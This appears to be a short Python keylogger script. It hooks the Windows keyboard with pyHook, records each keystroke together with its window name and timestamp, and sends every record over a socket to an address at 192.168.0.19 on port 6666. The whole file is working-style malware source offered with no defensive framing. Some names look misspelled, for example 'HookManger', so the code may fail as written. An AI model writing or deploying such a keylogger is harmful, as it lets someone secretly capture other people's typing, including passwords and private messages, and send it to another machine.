import pythoncom,pyHook
from socket_client import Clinet_PIC

def OnKeyboardEvent(event):
    dict_key={}
    dict_key['MessageName:']=event.MessageName
    dict_key['Message:'] = event.Name
    dict_key['Time:'] = event.Time
    dict_key['Window:'] = event.Window
    dict_key['Ascii:'] = event.Ascii
    dict_key['Key:'] = event.Key
    dict_key['KeyID:'] = event.KeyID

    Clinet_PIC('192.168.0.19',6666,dict_key)
    return True

def Keylogger():
    hm=pyHook.HookManger()
    hm.KeyDown=OnKeyboardEvent
    hm.HookKeyboard()
    pythoncom.PumpMessages()

if __name__ =="__main__":
    Keylogger()